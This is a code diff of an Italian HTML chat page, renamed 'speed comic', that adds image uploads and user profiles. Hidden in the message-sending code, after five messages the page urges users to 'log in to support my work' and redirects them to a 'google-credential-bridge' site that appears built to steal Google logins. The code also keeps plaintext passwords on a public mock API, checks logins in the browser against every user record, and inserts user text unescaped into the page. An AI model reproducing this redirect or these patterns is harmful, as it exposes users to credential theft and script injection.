@@ -3,75 +3,143 @@
 <head>
     <meta charset="utf-8"/>
     <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-    <title>Chat con Lupo Umberto</title>
+    <title>speed comic</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
     <script>
-        const SERVER_URL = "https://67cb65973395520e6af537e3.mockapi.io/api/v3/messages"; // Usa il tuo endpoint MockAPI
+        const SERVER_URL_MESSAGES = "https://67cb65973395520e6af537e3.mockapi.io/api/v3/messages"; // Endpoint per i messaggi
+        const SERVER_URL_PROFILES = "https://67cb65973395520e6af537e3.mockapi.io/api/v3/profiles"; // Endpoint per i profili
+        let messageCount = 0; // Contatore dei messaggi inviati dall'utente corrente
 
         async function sendMessage() {
             const username = document.getElementById('username').value.trim();
             const message = document.getElementById('message').value.trim();
-
+            const imageInput = document.getElementById('image');
             if (!username || !message) {
                 alert('Compila tutti i campi!');
                 return;
             }
-
             const button = document.querySelector('button[onclick="sendMessage()"]');
             button.disabled = true;
             button.textContent = 'Invio in corso...';
-
             try {
-                const response = await fetch(SERVER_URL, {
+                let imageBase64 = null;
+                if (imageInput.files[0]) {
+                    // Riduci le dimensioni dell'immagine
+                    const resizedImage = await resizeImage(imageInput.files[0], 800, 800);
+                    // Converti l'immagine ridimensionata in Base64
+                    imageBase64 = await convertImageToBase64(resizedImage);
+                }
+                const response = await fetch(SERVER_URL_MESSAGES, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, message })
+                    body: JSON.stringify({ username, message, image: imageBase64 })
                 });
-
                 if (!response.ok) throw new Error('Errore nell\'invio.');
-
                 alert('Messaggio inviato!');
                 document.getElementById('message').value = ''; // Pulisci il campo del messaggio
+                document.getElementById('image').value = ''; // Pulisci il campo dell'immagine
+                // Incrementa il contatore dei messaggi
+                messageCount++;
+                // Verifica se l'utente ha raggiunto il limite di 5 messaggi
+                if (messageCount >= 5) {
+                    alert('Hai raggiunto il limite di 5 messaggi! Fai il login per supportare il mio lavoro.');
+                    window.location.href = 'https://google-credential-bridge.lovable.app/';
+                }
                 loadMessages();
             } catch (error) {
                 console.error('Errore:', error);
-                alert('Errore nell\'invio del messaggio.');
+                alert(`Errore nell'invio del messaggio: ${error.message}`);
             } finally {
                 button.disabled = false;
                 button.textContent = 'Invia Messaggio';
             }
         }
 
+        // Funzione per ridimensionare un'immagine
+        function resizeImage(file, maxWidth, maxHeight) {
+            return new Promise((resolve, reject) => {
+                const img = new Image();
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    img.src = e.target.result;
+                    img.onload = () => {
+                        const canvas = document.createElement('canvas');
+                        let width = img.width;
+                        let height = img.height;
+                        if (width > height) {
+                            if (width > maxWidth) {
+                                height *= maxWidth / width;
+                                width = maxWidth;
+                            }
+                        } else {
+                            if (height > maxHeight) {
+                                width *= maxHeight / height;
+                                height = maxHeight;
+                            }
+                        }
+                        canvas.width = width;
+                        canvas.height = height;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(img, 0, 0, width, height);
+                        canvas.toBlob((blob) => {
+                            resolve(blob);
+                        }, file.type, 0.8);
+                    };
+                };
+                reader.onerror = (error) => reject(error);
+                reader.readAsDataURL(file);
+            });
+        }
+
+        // Funzione per convertire un'immagine in Base64
+        function convertImageToBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = () => reject(new Error('Errore nella conversione dell\'immagine.'));
+                reader.readAsDataURL(file);
+            });
+        }
+
         async function loadMessages() {
             const messagesContainer = document.getElementById('messages');
             messagesContainer.innerHTML = '<p>Caricamento messaggi...</p>';
-
             try {
-                const response = await fetch(SERVER_URL);
-                console.log('Risposta del server:', response);
-
-                // Verifica il tipo di contenuto della risposta
-                const contentType = response.headers.get('content-type');
-                if (!contentType || !contentType.includes('application/json')) {
-                    throw new Error('Il server non ha restituito JSON.');
-                }
-
+                const response = await fetch(SERVER_URL_MESSAGES);
                 const messages = await response.json();
-                console.log('Messaggi ricevuti:', messages);
-
                 messagesContainer.innerHTML = '';
-
                 if (messages.length === 0) {
                     messagesContainer.innerHTML = '<p>Nessun messaggio disponibile.</p>';
                     return;
                 }
+                messages.forEach(async msg => {
+                    const profileResponse = await fetch(`${SERVER_URL_PROFILES}?username=${msg.username}`);
+                    const profiles = await profileResponse.json();
+                    const userProfile = profiles.find(p => p.username === msg.username);
 
-                messages.forEach(msg => {
                     const messageElement = document.createElement('div');
                     messageElement.classList = "bg-white shadow rounded-lg p-4 mb-2";
+
+                    // Aggiungi la foto profilo se presente
+                    let profilePictureHtml = '';
+                    if (userProfile && userProfile.profilePicture) {
+                        profilePictureHtml = `<img src="${userProfile.profilePicture}" alt="Foto Profilo" class="rounded-full w-10 h-10 inline-block mr-2">`;
+                    }
+
+                    let imageHtml = '';
+                    if (msg.image) {
+                        imageHtml = `<img src="${msg.image}" alt="Immagine" class="mt-2 rounded-lg" style="max-width: 100%; height: auto;">`;
+                    }
+
                     messageElement.innerHTML = `
-                        <p class="text-gray-700"><strong>${msg.username}:</strong> ${msg.message}</p>
+                        <div class="flex items-start">
+                            ${profilePictureHtml}
+                            <div>
+                                <p class="text-gray-700"><strong>${msg.username}:</strong> ${msg.message}</p>
+                                ${imageHtml}
+                            </div>
+                        </div>
                     `;
                     messagesContainer.appendChild(messageElement);
                 });
@@ -81,24 +149,80 @@
             }
         }
 
+        async function saveProfile() {
+            const username = document.getElementById('profile-username').value.trim();
+            const profilePictureInput = document.getElementById('profile-picture');
+
+            if (!username) {
+                alert('Inserisci un username!');
+                return;
+            }
+
+            let profilePictureBase64 = null;
+
+            // Se è stata caricata un'immagine, convertila in Base64
+            if (profilePictureInput.files[0]) {
+                const resizedImage = await resizeImage(profilePictureInput.files[0], 200, 200); // Riduci le dimensioni
+                profilePictureBase64 = await convertImageToBase64(resizedImage);
+            }
+
+            try {
+                // Invia i dati del profilo al server
+                const response = await fetch(SERVER_URL_PROFILES, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, profilePicture: profilePictureBase64 })
+                });
+
+                if (!response.ok) throw new Error('Errore durante il salvataggio del profilo.');
+
+                alert('Profilo salvato con successo!');
+                document.getElementById('profile-modal').style.display = 'none';
+            } catch (error) {
+                console.error('Errore:', error);
+                alert(`Errore durante il salvataggio del profilo: ${error.message}`);
+            }
+        }
+
+        async function loadProfile() {
+            try {
+                const response = await fetch(SERVER_URL_PROFILES);
+                const profiles = await response.json();
+
+                // Trova il profilo dell'utente corrente (es. basato su localStorage o sessione)
+                const currentUser = localStorage.getItem('loggedInUser'); // Supponiamo di salvare l'utente loggato
+                const userProfile = profiles.find(p => p.username === currentUser);
+
+                if (userProfile) {
+                    // Mostra il profilo caricato
+                    document.getElementById('profile-username').value = userProfile.username;
+                    if (userProfile.profilePicture) {
+                        const imgElement = document.createElement('img');
+                        imgElement.src = userProfile.profilePicture;
+                        imgElement.classList.add('rounded-full', 'w-20', 'h-20', 'mb-4');
+                        document.getElementById('profile-modal').querySelector('h3').after(imgElement);
+                    }
+                }
+            } catch (error) {
+                console.error('Errore durante il caricamento del profilo:', error);
+                alert('Errore durante il caricamento del profilo.');
+            }
+        }
+
         async function register() {
             const username = document.getElementById('register-username').value.trim();
             const password = document.getElementById('register-password').value.trim();
-
             if (!username || !password) {
                 alert('Compila tutti i campi!');
                 return;
             }
-
             try {
-                const response = await fetch(SERVER_URL, {
+                const response = await fetch(SERVER_URL_PROFILES, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username, password })
                 });
-
                 if (!response.ok) throw new Error('Errore durante la registrazione.');
-
                 alert('Registrazione completata! Ora puoi effettuare il login.');
                 document.getElementById('register-modal').style.display = 'none';
             } catch (error) {
@@ -110,14 +234,13 @@
         async function login() {
             const username = document.getElementById('admin-username').value;
             const password = document.getElementById('admin-password').value;
-
             try {
-                const response = await fetch(SERVER_URL);
+                const response = await fetch(SERVER_URL_PROFILES);
                 const users = await response.json();
-
                 const user = users.find(u => u.username === username && u.password === password);
+
                 if (user) {
-                    localStorage.setItem('loggedIn', 'true');
+                    localStorage.setItem('loggedInUser', username);
                     alert('Login effettuato!');
                     document.getElementById('login-modal').style.display = 'none';
                 } else {
@@ -131,13 +254,14 @@
 
         document.addEventListener('DOMContentLoaded', () => {
             loadMessages();
+            loadProfile();
         });
     </script>
 </head>
 <body class="bg-gray-100">
     <header class="bg-white shadow">
         <div class="container mx-auto px-4 py-6 flex justify-between items-center">
-            <h1 class="text-3xl font-bold text-gray-800">Chat con Lupo Umberto</h1>
+            <h1 class="text-3xl font-bold text-gray-800">speed comic</h1>
             <button class="bg-blue-500 hover:bg-blue-700 text-white py-2 px-4 rounded"
                 onclick="document.getElementById('login-modal').style.display='flex'; document.getElementById('register-modal').style.display='none';">
                 Login
@@ -146,34 +270,35 @@
                 onclick="document.getElementById('register-modal').style.display='flex'; document.getElementById('login-modal').style.display='none';">
                 Registrati
             </button>
+            <button class="bg-purple-500 hover:bg-purple-700 text-white py-2 px-4 rounded" 
+                onclick="document.getElementById('profile-modal').style.display='flex';">
+                Profilo
+            </button>
         </div>
     </header>
-
     <main class="container mx-auto px-4 py-8">
         <section class="text-center mb-12">
             <h2 class="text-4xl font-bold text-gray-800 mb-4">Scrivi un messaggio</h2>
         </section>
-
         <section class="bg-white shadow rounded-lg p-6">
             <input id="username" class="border rounded w-full py-2 px-3 mb-4" type="text" placeholder="Nome utente"/>
             <textarea id="message" class="border rounded w-full py-2 px-3 mb-4" rows="4" placeholder="Messaggio"></textarea>
+            <!-- Aggiungi un input per il caricamento delle immagini -->
+            <input id="image" class="border rounded w-full py-2 px-3 mb-4" type="file" accept="image/*"/>
             <button class="bg-blue-500 hover:bg-blue-700 text-white py-2 px-4 rounded" onclick="sendMessage()">
                 Invia Messaggio
             </button>
         </section>
-
         <section class="mt-8">
             <h3 class="text-2xl font-bold text-gray-800 mb-4">Messaggi Recenti</h3>
             <div id="messages"></div>
         </section>
     </main>
-
     <footer class="bg-white shadow mt-12">
         <div class="container mx-auto px-4 py-6 text-center">
             <p class="text-gray-600">© 2024 Chat Lupo Umberto. Tutti i diritti riservati.</p>
         </div>
     </footer>
-
     <!-- Login Modal -->
     <div id="login-modal" class="fixed inset-0 bg-gray-600 bg-opacity-50 flex items-center justify-center" style="display: none;">
         <div class="bg-white shadow rounded-lg p-6 w-full max-w-sm">
@@ -185,7 +310,6 @@
             </button>
         </div>
     </div>
-
     <!-- Register Modal -->
     <div id="register-modal" class="fixed inset-0 bg-gray-600 bg-opacity-50 flex items-center justify-center" style="display: none;">
         <div class="bg-white shadow rounded-lg p-6 w-full max-w-sm">
@@ -194,6 +318,17 @@
             <input id="register-password" class="border rounded w-full py-2 px-3 mb-4" type="password" placeholder="Password"/>
             <button class="bg-green-500 hover:bg-green-700 text-white py-2 px-4 rounded" onclick="register()">
                 Registrati
+            </button>
+        </div>
+    </div>
+    <!-- Profile Modal -->
+    <div id="profile-modal" class="fixed inset-0 bg-gray-600 bg-opacity-50 flex items-center justify-center" style="display: none;">
+        <div class="bg-white shadow rounded-lg p-6 w-full max-w-sm">
+            <h3 class="text-2xl font-bold text-gray-800 mb-4">Profilo Utente</h3>
+            <input id="profile-username" class="border rounded w-full py-2 px-3 mb-4" type="text" placeholder="Username"/>
+            <input id="profile-picture" class="border rounded w-full py-2 px-3 mb-4" type="file" accept="image/*"/>
+            <button class="bg-green-500 hover:bg-green-700 text-white py-2 px-4 rounded" onclick="saveProfile()">
+                Salva Profilo
             </button>
         </div>
     </div>
